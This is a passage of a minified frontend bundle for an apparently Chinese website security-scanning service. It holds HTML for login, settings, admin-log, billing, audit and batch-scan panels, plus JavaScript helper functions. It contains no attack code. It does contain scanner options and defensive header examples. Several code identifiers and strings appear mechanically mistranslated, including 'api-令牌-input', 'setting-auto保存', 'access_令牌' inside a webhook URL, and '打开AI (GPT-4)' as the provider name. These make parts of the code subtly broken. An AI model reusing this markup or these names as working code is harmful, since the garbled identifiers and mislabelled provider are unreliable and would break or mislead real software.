        </div>

      </div>

    </div>



    <!-- 注册表单 -->

    <div id="auth-register" style="display:none">

      <div class="card auth-form">

        <h3>注册新账号</h3>

        <div class="auth-form-error" id="register-error"></div>

        <div class="auth-form-row">

          <input type="text" id="reg-username" placeholder="用户名" aria-label="用户名" />

        </div>

        <div class="auth-form-row">

          <input type="text" id="reg-email" placeholder="邮箱（可选）" aria-label="邮箱" />

        </div>

        <div class="auth-form-row">

          <input type="tel" id="reg-phone" placeholder="手机号（可选，暂不发送短信）" aria-label="手机号" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reg-password" placeholder="密码" aria-label="密码" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reg-password2" placeholder="确认密码" aria-label="确认密码" />

        </div>

        <div class="auth-form-row">

          <div id="auth-challenge-question-reg" class="auth-form-hint" style="margin-bottom:8px">验证码加载中...</div>
          <input type="hidden" id="auth-challenge-token-reg" />
          <input type="text" id="reg-challenge-answer" placeholder="验证码答案（30秒有效）" aria-label="验证码答案（30秒有效）" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="refreshAuthChallenge()">刷新验证码</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="doResendVerification()">重新发送验证邮件</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doRegister()">注 册</button>

        </div>

        <div class="auth-form-row">

          <input type="text" id="verify-email-token" placeholder="邮箱验证令牌（收到邮件后填写）" aria-label="邮箱验证 令牌" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="doVerifyEmailFromToken()">验证邮箱</button>

        </div>

        <div class="auth-form-switch">

          已有账号？<a onclick="toggleAuthForm('login')">去登录</a>

        </div>

      </div>

    </div>



    <!-- 已登录：显示用户信息 -->

    <div id="auth-logged" style="display:none">

      <div class="settings-user-row">

        <div>

          <div class="user-name" id="auth-display-name">用户</div>

          <div class="user-label" id="auth-user-role">已登录</div>

          <div class="user-credits" id="user-credits" style="font-size:12px;color:var(--warning);margin-top:4px">额度：--</div>

        </div>

        <button class="auth-logout-btn" onclick="doLogout()">退出登录</button>

      </div>

    </div>

  </div>



  <!-- 账号统计 -->

  <div class="settings-group">

    <div class="settings-row-static">

      <div style="text-align:center;flex:1">

        <div class="num" id="stat-scan-count" style="color:var(--primary);font-size:18px;font-weight:700">0</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">扫描次数</div>

      </div>

      <div style="text-align:center;flex:1;border-left:1px solid var(--border-light);border-right:1px solid var(--border-light)">

        <div class="num" id="stat-avg-score" style="color:var(--success);font-size:18px;font-weight:700">-</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">平均评分</div>

      </div>

      <div style="text-align:center;flex:1">

        <div class="num" id="stat-fixed-count" style="color:var(--warning);font-size:18px;font-weight:700">0</div>

        <div style="font-size:11px;color:var(--text-secondary);margin-top:2px">已修复</div>

      </div>

    </div>

  </div>



  <!-- 设置菜单 -->

  <div class="settings-group">

    <div class="settings-row" onclick="showProfileTab('history')">

      <span>扫描历史</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('knowledge')">

      <span>安全知识库</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('monitor')">

      <span>监控目标</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('alerts')">

      <span>告警历史</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('credits')">

      <span>额度与使用记录</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="navigateTo('assets')">

      <span>资产管理</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="navigateTo('billing')">

      <span>购买积分套餐</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('settings')">

      <span>扫描设置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

    <div class="settings-row" onclick="showProfileTab('notifications')">

      <span>通知设置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>
    <div class="settings-row" id="admin-logs-menu" style="display:none" onclick="showProfileTab('admin-logs')">
      <span>管理员日志</span>
      <span class="settings-arrow">&#x203A;</span>
    </div>
    <div class="settings-row" onclick="showProfileTab('scan-tasks')">
      <span>扫描任务管理</span>
      <span class="settings-arrow">&#x203A;</span>
    </div>

    <div class="settings-row" onclick="showProfileTab('ai-config')">

      <span>安全顾问配置</span>

      <span class="settings-arrow">&#x203A;</span>

    </div>

  </div>



  <!-- 接口令牌 -->

  <div class="settings-group">

    <div class="settings-group-title">接口令牌</div>

    <div class="settings-row-static">

      <input type="text" id="api-令牌-input" readonly value="登录后显示 令牌" style="flex:1;background:#2b2b2b;color:var(--text-secondary);font-family:monospace;font-size:11px" />

      <button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="copyApiToken()">复制</button>

    </div>

    <p style="font-size:11px;color:var(--text-secondary);margin-top:6px">此 令牌 用于 API 调用身份认证，登录后自动生成。令牌 会在服务端密钥变更或过期后失效。</p>

  </div>



  <!-- 扫描历史面板 -->

  <div id="profile-tab-history" class="profile-tab" style="display:none">

    <div class="card">

      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

        <div class="card-title">扫描历史</div>

        <button class="fixer-btn secondary" style="height:36px;padding:0 14px;font-size:12px" onclick="clearScanHistory()">清空历史</button>

      </div>

      <!-- 风险趋势 -->

      <div id="history-trend-wrap" style="margin-bottom:16px;display:none">

        <div style="font-size:13px;font-weight:600;margin-bottom:8px">最近 5 次风险趋势</div>

        <div id="history-trend-chart" style="height:60px"></div>

      </div>

      <!-- 对比模式工具栏 -->

      <div id="history-compare-bar" style="display:none;align-items:center;gap:8px;margin-bottom:12px;padding:10px;background:var(--bg);border-radius:2px;border:1px solid var(--border)">

        <span style="font-size:12px;color:var(--text-secondary)">已选择 <strong id="history-compare-count">0</strong> 项</span>

        <button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:auto" onclick="cancelHistoryCompare()">取消</button>

        <button class="fixer-btn primary" style="height:32px;padding:0 12px;font-size:12px" id="history-compare-btn" onclick="doHistoryCompare()" disabled>对比</button>

      </div>

      <div id="scan-history-list"></div>

      <div id="history-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 安全知识库面板 -->

  <div id="profile-tab-knowledge" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">安全响应头速查</div>

      <div class="finding-section" style="margin-top:10px">

        <h4>Strict-Transport-Security (HSTS)</h4>

        <p>强制浏览器使用 HTTPS，防止 SSL 剥离攻击。</p>

        <div class="code-block" style="margin-top:6px">add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;</div>

      </div>

      <div class="finding-section">

        <h4>Content-Security-Policy (CSP)</h4>

        <p>限制页面可加载的资源来源，防止 XSS 攻击。</p>

        <div class="code-block" style="margin-top:6px">add_header Content-Security-Policy "default-src 'self'; script-src 'self'; frame-ancestors 'none'" always;</div>

      </div>

      <div class="finding-section">

        <h4>X-Frame-Options</h4>

        <p>防止网站被嵌入到恶意 iframe 中（点击劫持）。</p>

        <div class="code-block" style="margin-top:6px">add_header X-Frame-Options "DENY" always;</div>

      </div>

      <div class="finding-section">

        <h4>X-Content-Type-Options</h4>

        <p>禁止浏览器进行 MIME 类型嗅探。</p>

        <div class="code-block" style="margin-top:6px">add_header X-Content-Type-Options "nosniff" always;</div>

      </div>

    </div>

  </div>



  <!-- 监控目标面板 -->

  <div id="profile-tab-monitor" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">监控目标管理</div>

      <p class="card-desc" style="margin-bottom:14px">添加需要定期扫描的网站 URL，系统将按设定频率自动扫描。</p>

      <div class="monitor-add-row">

        <input type="url" id="monitor-url-input" placeholder="输入网址，例如 https://示例.com" />

        <select id="monitor-freq-select">

          <option value="daily">每天</option>

          <option value="weekly">每周</option>

          <option value="none">不扫描</option>

        </select>

        <button class="monitor-add-btn" onclick="addMonitorTarget()"> 添加</button>

      </div>

      <div id="monitor-target-list"></div>

    </div>

  </div>



  <!-- 告警历史面板 -->

  <div id="profile-tab-alerts" class="profile-tab" style="display:none">

    <div class="card">

      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

        <div class="card-title">告警历史</div>

        <button class="fixer-btn secondary" style="height:36px;padding:0 14px;font-size:12px" onclick="markAllAlertsRead()">全部已读</button>

      </div>

      <div id="alerts-list" style="min-height:60px"></div>

      <div id="alerts-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 设置面板 -->

  <div id="profile-tab-settings" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title" data-i18n="scanSettings">扫描设置</div>

      <div class="settings-row-static" style="margin-top:10px">
        <span data-i18n="language">界面语言 / Language</span>
        <select id="ui-language-select" onchange="setUILanguage(this.value)" style="min-width:150px;padding:7px;border:1px solid var(--border);border-radius:4px;background:var(--bg);color:var(--text)">
          <option value="zh-CN">简体中文</option>
          <option value="en-US">English</option>
        </select>
      </div>

      <div class="settings-row" style="margin-top:10px" onclick="toggleSetting(this, 'auto保存')">

        <span data-i18n="autoSave">自动保存扫描结果</span>

        <span class="settings-toggle on" id="setting-auto保存" data-enabled="true"></span>

      </div>

      <div class="settings-row" onclick="toggleSetting(this, 'darkMode')">

        <span data-i18n="darkMode">深色模式</span>

        <span class="settings-toggle" id="setting-darkMode" data-enabled="false"></span>

      </div>

      <div class="settings-row" onclick="toggleSetting(this, 'notify')">

        <span data-i18n="scanNotify">扫描完成提醒</span>

        <span class="settings-toggle on" id="setting-notify" data-enabled="true"></span>

      </div>

    </div>

  </div>



  <!-- 通知设置面板 -->

  <div id="profile-tab-notifications" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">通知设置</div>

      <p class="card-desc" style="margin-bottom:14px">配置告警通知方式，支持邮件和 Webhook（钉钉/企业微信/飞书）。</p>

      <div style="margin-bottom:12px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">通知邮箱</label>

        <input type="email" id="notify-email-input" placeholder="name@example.com" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

      </div>

      <div style="margin-bottom:12px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">Webhook 地址</label>

        <input type="url" id="notify-webhook-input" placeholder="https://oapi.dingtalk.com/robot/send?access_令牌=你的令牌" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

        <p style="font-size:12px;color:var(--text-secondary);margin-top:4px">支持钉钉、企业微信、飞书等 Markdown Webhook</p>

      </div>

      <div style="margin-bottom:16px">

        <label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">告警阈值</label>

        <select id="notify-threshold-select" style="width:100%;padding:10px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)">

          <option value="critical">仅严重 (Critical)</option>

          <option value="high">高危及以上 (High+)</option>

          <option value="medium">中危及以上 (Medium+)</option>

          <option value="low">低危及以上 (Low+)</option>

          <option value="all">全部通知</option>

        </select>

      </div>

      <button class="fixer-btn primary" style="width:100%" onclick="saveNotificationSettings()">保存设置</button>

    </div>

  </div>



  <!-- 额度与使用记录面板 -->

  <div id="profile-tab-credits" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">额度与使用记录</div>

      <div style="display:flex;align-items:center;gap:12px;margin:14px 0;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:2px">

        <div>

          <div style="font-size:12px;color:var(--text-secondary)">当前额度</div>

          <div id="credits-balance" style="font-size:24px;font-weight:700;color:var(--warning)">--</div>

        </div>

        <button class="fixer-btn secondary" style="margin-left:auto;height:32px;padding:0 14px;font-size:12px" onclick="loadCreditsUsage()">刷新</button>

      </div>

      <div id="credits-usage-list" style="min-height:60px">

        <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取使用记录...</div>

      </div>

      <div id="credits-pagination" class="pagination-bar" style="display:none"></div>

    </div>

  </div>



  <!-- 安全顾问配置面板 -->

  <div id="profile-tab-admin-logs" class="profile-tab" style="display:none">
    <div class="card">
      <div class="card-title">管理员日志</div>
      <p class="card-desc">查看账号操作记录与邮件投递状态。邮箱地址已脱敏，邮件正文和验证令牌不会保存。</p>
      <div style="margin-top:16px;font-size:13px;font-weight:600">操作审计日志</div>
      <div id="admin-audit-summary" style="margin-top:10px">正在读取统计...</div>
      <div id="admin-dashboard-stats" style="margin-top:12px">正在读取趋势统计...</div>
      <div style="margin-top:20px;font-size:13px;font-weight:600">用户管理</div>
      <p class="card-desc">账号联系方式仅脱敏展示；角色调整和停用操作需要二次确认。</p>
      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
        <input id="admin-user-query" placeholder="用户名、邮箱或手机号" style="max-width:220px">
        <select id="admin-user-role" style="max-width:120px"><option value="">全部角色</option><option value="admin">管理员</option><option value="member">成员</option><option value="viewer">只读</option></select>
        <select id="admin-user-active" style="max-width:120px"><option value="">全部状态</option><option value="1">正常</option><option value="0">已停用</option></select>
        <button class="btn btn-secondary" id="admin-user-filter">查询用户</button>
      </div>
      <div id="admin-user-list" style="margin-top:10px">正在读取用户...</div>
      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
        <select id="admin-log-days" style="max-width:120px"><option value="7">近 7 天</option><option value="30" selected>近 30 天</option><option value="90">近 90 天</option><option value="365">近 365 天</option></select>
        <input id="admin-log-username" placeholder="用户名" style="max-width:140px">
        <input id="admin-log-target" placeholder="目标或资源编号" style="max-width:160px">
         <input id="admin-log-action" placeholder="操作类型" style="max-width:140px">
         <input id="admin-log-resource-type" placeholder="资源类型" style="max-width:120px">
         <select id="admin-log-status" style="max-width:120px"><option value="">全部结果</option><option value="success">成功</option><option value="failure">失败</option><option value="error">异常</option></select>
         <button class="btn btn-secondary" id="admin-log-filter">筛选</button>
         <button class="btn btn-secondary" id="admin-log-export">导出 CSV</button>
      </div>
      <div id="admin-audit-logs" style="margin-top:10px"></div>
      <div style="margin-top:20px;font-size:13px;font-weight:600">邮件投递日志</div>
      <div id="admin-email-logs" style="margin-top:10px"></div>
    </div>
  </div>

  <div id="profile-tab-scan-tasks" class="profile-tab" style="display:none">
    <div class="card">
      <div class="card-title">扫描任务管理</div>
      <p class="card-desc">统一查看批量扫描进度，可暂停排队任务、恢复或取消任务。</p>
      <div id="scan-task-list" style="margin-top:12px">正在读取任务...</div>
    </div>
  </div>

  <div id="profile-tab-ai-config" class="profile-tab" style="display:none">

    <div class="card">

      <div class="card-title">安全顾问配置</div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">接口密钥</label>

        <div style="display:flex;gap:8px">

          <input id="ai-config-apikey" type="password" placeholder="sk-你的密钥" style="flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

          <button onclick="toggleApiKeyVisibility()" id="ai-config-eye" style="background:var(--bg-secondary);border:1px solid var(--border);border-radius:2px;padding:0 12px;cursor:pointer;font-size:13px;color:var(--text-secondary)">显示</button>

        </div>

        <div style="font-size:11px;color:var(--text-lighter);margin-top:4px">接口密钥 仅保存在浏览器本地，不会上传到服务器。</div>

      </div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">模型提供商</label>

        <select id="ai-config-provider" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)">

          <option value="openai">打开AI (GPT-4)</option>

        </select>

      </div>

      <div style="margin-top:14px">

        <label style="display:block;font-size:13px;color:var(--text-secondary);margin-bottom:6px">模型名称</label>

        <input id="ai-config-model" type="text" placeholder="例如：gpt-4o-mini" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:2px;font-size:13px;background:var(--bg);color:var(--text)" />

      </div>

      <div class="settings-row" style="margin-top:14px" onclick="toggleAISetting('useLLM')">

        <span>启用 LLM（优先调用真实大模型）</span>

        <span class="settings-toggle on" id="setting-useLLM" data-enabled="true"></span>

      </div>

      <div style="margin-top:14px;display:flex;gap:8px">

        <button onclick="saveAIConfig()" style="flex:1;background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:500">保存配置</button>

        <button onclick="clearAIConfig()" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:10px;border-radius:2px;cursor:pointer;font-size:13px">清除配置</button>

      </div>

    </div>

  </div>



</div>



<!-- 计费套餐页面 -->

<div class="page" id="page-billing">

  <div class="workbench-header">

    <h1 class="workbench-title">服务套餐</h1>

    <span class="workbench-subtitle">购买积分套餐，按量使用扫描与修复服务</span>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">选择套餐</div>

    <p class="card-desc" style="margin-bottom:14px">额度用于体检、复测、修复验证、报告导出和审计留痕，购买后即时到账。</p>

    <div id="billing-plans-list" style="min-height:80px">

      <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在加载服务套餐...</div>

    </div>

  </div>



  <div class="card">

    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">

      <div class="card-title">服务记录</div>

      <button class="fixer-btn secondary" style="height:32px;padding:0 14px;font-size:12px" onclick="loadBillingPage()">刷新</button>

    </div>

    <div id="billing-records-list" style="min-height:60px">

      <div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取充值记录...</div>

    </div>

    <div id="billing-records-pagination" class="pagination-bar" style="display:none"></div>

  </div>

</div>



<div class="page" id="page-audit">

  <div class="workbench-header">

    <h1 class="workbench-title">源码与上线审计</h1>

    <span class="workbench-subtitle">用于检查网站是否存在源码泄露、源码映射暴露、目录索引、敏感文件与上线前基础风险</span>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">审计说明</div>

    <p class="card-desc" style="margin-bottom:14px">这里不是本地仓库的静态代码审计，而是针对目标网站的源码泄露与上线前安全审计。输入网址后，系统会复用现有扫描能力，重点筛查 source map、目录索引、敏感文件、HTML 注释、调试信息、配置暴露与高风险外链，并输出可交付的审计结论。</p>

    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px">

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>1. 源码泄露</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查 .map、source map、HTML 注释、目录索引、调试输出等风险。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>2. 上线检查</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">检查常见安全响应头、敏感路径、登录态与重定向风险。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>3. 结果输出</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">输出命中项、证据片段、置信度与可直接交付的结论。</div></div>

      <div style="padding:12px 14px;border:1px solid var(--border);border-radius:2px;background:var(--bg)"><strong>4. 复测建议</strong><div style="font-size:12px;color:var(--text-secondary);margin-top:4px">给出修复方向、复测建议与二次核验重点。</div></div>

    </div>

  </div>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">执行审计</div>

    <div style="display:grid;gap:12px;margin-top:12px">

      <div>

        <label for="audit-url" style="display:block;margin-bottom:6px;font-size:13px;font-weight:600">目标网址</label>

        <input id="audit-url" type="url" placeholder="输入网站地址，例如 https://example.com" style="width:100%;padding:12px 14px;border:1px solid var(--border);border-radius:2px;font-size:14px;background:var(--bg);color:var(--text)" />

      </div>

      <label class="scan-checkbox" style="margin:0">

        <input id="audit-auth-check" type="checkbox" onchange="document.getElementById('audit-run-btn').disabled=!this.checked" />

        <span>我已确认目标属于授权范围，不涉及受限目标</span>

      </label>

      <div style="display:flex;flex-wrap:wrap;gap:10px;align-items:center">

        <button id="audit-run-btn" class="btn btn-primary" onclick="runAuditWorkbench()" disabled>开始审计</button>

        <button class="btn btn-secondary" onclick="fillAuditTargetFromScan()">使用当前扫描网址</button>

        <button class="btn btn-secondary" onclick="downloadAuditReport()">导出审计 PDF</button>

      </div>

      <div id="audit-status" style="font-size:13px;color:var(--text-secondary)">请输入网址后开始审计。</div>

    </div>

  </div>



  <div class="card">

    <div class="card-title">审计结果</div>

    <div id="audit-result" style="margin-top:12px;min-height:120px">

      <div style="text-align:center;padding:24px 16px;color:var(--text-secondary)">审计结果会显示在这里。</div>

    </div>

  </div>

</div>



<!-- Batch Scan Modal -->

<div class="modal" id="batch-scan-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center">

  <div class="modal-content" style="background:var(--card);border:1px solid var(--border);border-radius:2px;padding:20px;max-width:520px;width:92vw;max-height:85vh;overflow-y:auto">

    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">

      <h3 style="margin:0;font-size:16px">批量体检</h3>

      <button onclick="closeBatchScanModal()" aria-label="关闭批量体检" style="background:none;border:none;font-size:20px;cursor:pointer;color:var(--text-secondary)">×</button>

    </div>

    <div style="font-size:12px;color:var(--text-secondary);margin-bottom:8px">每行一个 URL，最多 5 个。建议先用快速模式体检公开测试站点：</div>

    <textarea id="batch-urls" placeholder="https://示例.com&#10;https://测试站点.com&#10;https://样例.org" style="width:100%;min-height:120px;padding:10px;border:1px solid var(--border);border-radius:2px;font-family:monospace;font-size:12px;background:var(--bg);color:var(--text);resize:vertical"></textarea>

    <div style="margin:10px 0;display:flex;align-items:center;gap:6px;font-size:12px">

      <input type="checkbox" id="batch-deep" style="cursor:pointer" />

      <label for="batch-deep" style="cursor:pointer;color:var(--text-secondary)">深度扫描（含 XSS/SQLi 注入测试）</label>

    </div>

    <label class="scan-checkbox" style="margin-bottom:10px">

      <input id="batch-auth-check" type="checkbox" onchange="document.getElementById('batch-go-btn').disabled=!this.checked" />

      <span>我已确认目标属于授权范围，不涉及受限目标</span>

    </label>

    <div id="batch-results" style="margin-top:12px"></div>

    <div style="display:flex;gap:8px;margin-top:14px">

      <button onclick="closeBatchScanModal()" style="flex:1;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:10px;border-radius:2px;cursor:pointer">关闭</button>

      <button onclick="doBatchScan()" id="batch-go-btn" disabled style="flex:1;background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:10px;border-radius:2px;cursor:pointer;font-weight:500">开始批量体检</button>

    </div>

  </div>

</div>



<nav class="bottom-nav">

  <button class="nav-item active" data-page="home" onclick="navigateTo('home')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>

    <span>首页</span>

  </button>

  <button class="nav-item" data-page="scan" onclick="navigateTo('scan')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>

    <span>扫描</span>

  </button>

  <button class="nav-item" data-page="fixer" onclick="navigateTo('fixer')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>

    <span>修复器</span>

  </button>

  <button class="nav-item" data-page="tickets" onclick="navigateTo('tickets')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>

    <span>工单</span>

  </button>

  <button class="nav-item" data-page="billing" onclick="navigateTo('billing')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>

    <span>计费</span>

  </button>

  <button class="nav-item" data-page="audit" onclick="navigateTo('audit')">

    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l7 4v6c0 5-3.8 9.7-7 10-3.2-.3-7-5-7-10V6l7-4z"/><path d="M9 12l2 2 4-4"/></svg>

    <span>审计</span>

  </button>

  <button class="nav-item" data-page="profile" onclick="navigateTo('profile')">

    <div style="position:relative">

      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>

      <span id="nav-alert-badge" style="display:none;position:absolute;top:-4px;right:-6px;background:var(--danger);color:#fff;font-size:10px;font-weight:700;padding:1px 5px;border-radius:2px;min-width:16px;text-align:center">0</span>

    </div>

    <span>我的</span>

  </button>

</nav>



<!-- 右上角主题切换按钮 -->

<button class="theme-fab" id="theme-fab" onclick="toggleThemeQuick()" aria-label="切换明暗主题" title="切换主题">

  <svg id="theme-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px">

    <circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>

  </svg>

</button>

`;function it(e){return document.getElementById(e)||null}function lt(e,i){let t=it(e);t&&(t.textContent=i)}function Ki(e,i){let t=it(e);t&&(t.innerHTML=i)}function $e(e,i){let t=it(e);t&&(t.style.display=i)}function w(e){if(e==null)return"";let i=document.createElement("div");return i.appendChild(document.createTextNode(String(e))),i.innerHTML}function xe(e){return String(e??"").replace(/'/g,"&#39;").replace(/"/g,"&quot;")}function nt(e){try{return/^https?:\/\//i.test(e)||(e="http://"+e),new URL(e).hostname}catch{return e.replace(/^https?:\/\//i,"").split("/")[0]}}function Ut(e){return e=parseInt(e,10),isNaN(e)&&(e=0),e>=75?"#73c990":e>=50?"#f0a732":"#c75450"}function Ht(e){return e=parseInt(e,10),isNaN(e)&&(e=0),e=Math.max(0,Math.min(100,e)),e>=75?"conic-gradient(#73c990 0% "+e+"%, #334155 "+e+"% 100%)":e>=50?"conic-gradient(#f0a732 0% "+e+"%, #334155 "+e+"% 100%)":"conic-gradient(#c75450 0% "+e+"%, #334155 "+e+"% 100%)"}function Yi(e){return e==="严重"||e==="critical"||e==="高风险"||e==="high"?"high":e==="中风险"||e==="medium"?"medium":"low"}function kt(e){return navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(e):new Promise((i,t)=>{try{let r=document.createElement("textarea");r.value=e,r.style.position="fixed",r.style.left="-9999px",document.body.appendChild(r),r.select(),document.execCommand("copy"),document.body.removeChild(r),i()}catch(r){t(r)}})}function Jt(e){if(!e)return"-";try{const i=new Date(e);if(isNaN(i.getTime()))return e;const t=r=>String(r).padStart(2,"0");return`${i.getFullYear()}-${t(i.getMonth()+1)}-${t(i.getDate())} ${t(i.getHours())}:${t(i.getMinutes())}`}catch{return e}}function qe(e){if(!e)return"未知错误";let i="";return typeof e.error=="string"&&e.error?i=e.error:typeof e.detail=="string"&&e.detail?i=e.detail:Array.isArray(e.detail)&&e.detail.length>0?i=e.detail.map(function(t){return t?typeof t=="string"?t:typeof t.msg=="string"&&t.msg?t.msg:Array.isArray(t.loc)&&t.loc.length?String(t.loc[t.loc.length-1]):"":""}).filter(Boolean).join("；"):typeof e.message=="string"&&e.message?i=e.message:i="请求失败",typeof e.code=="string"&&!i.includes(e.code)&&e.code!=="ERROR"&&(i+="（"+e.code+"）"),e.restricted_code==="restricted"?i+="（该目标类型受限，请确认您拥有合法授权后再扫描）":e.restricted_code==="ownership_required"?i+="，请先完成域名归属验证。":e.restricted_code==="unauthorized"&&(i+="（请先确认您有权扫描该目标）"),i}function Kt(e){return e&&e._status===402&&e.code==="PAYMENT_REQUIRED"}function $t(e){return Kt(e)?typeof e.message=="string"&&e.message||"额度不足，请充值后再试":""}function ut(e){let i=e&&(e.message||e.error||e.detail)||String(e)||"未知错误";return/timeout|timed out/i.test(i)?"请求超时，请检查网络连接或稍后重试":/network|fetch|internet|offline|failed to fetch|connect/i.test(i)?"网络连接异常，请确认本地后端已启动，或检查防火墙是否拦截了 127.0.0.1:8011":/403|forbidden/i.test(i)?"请求被拒绝，请检查权限或目标授权状态":/404|not found/i.test(i)?"请求的资源不存在，请确认接口或页面地址是否正确":/500|502|503|504|server error/i.test(i)?"服务器暂时不可用，请稍后重试，或重启本地后端后再试":/unauthorized|401|未登录|登录|token|jwt/i.test(i)?"登录状态已过期，请重新登录":/dns|resolve|name or service not known/i.test(i)?"目标域名无法解析，请检查网址是否正确":/connection refused|econnrefused/i.test(i)?"本地服务未启动或端口被占用，请重新打开安装包或检查 8011 端口":i}function ue(e,i){let 